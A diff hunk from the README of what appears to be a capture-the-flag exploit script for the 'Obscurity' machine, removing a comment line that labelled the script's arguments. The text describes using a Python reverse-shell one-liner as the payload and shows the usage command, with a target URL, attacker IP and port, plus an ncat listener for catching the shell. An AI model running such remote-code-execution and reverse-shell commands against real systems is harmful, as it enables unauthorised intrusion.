@@ -69,8 +69,7 @@ I used the python one-liner reverse shell from pentestmonkey as a payload.
 
 the script can be used like this:
     ./obscurity_webserver_python_RCE.sh http://obscure.htb:8080/ 10.10.14.2 2000
-                  ^         ^        ^       ^         ^
-              PROTOCOL    HOST     PORT  YOUR IP   YOUR PORT
+
 catching with a netcat listener:
     ncat -lvnp 2000
 
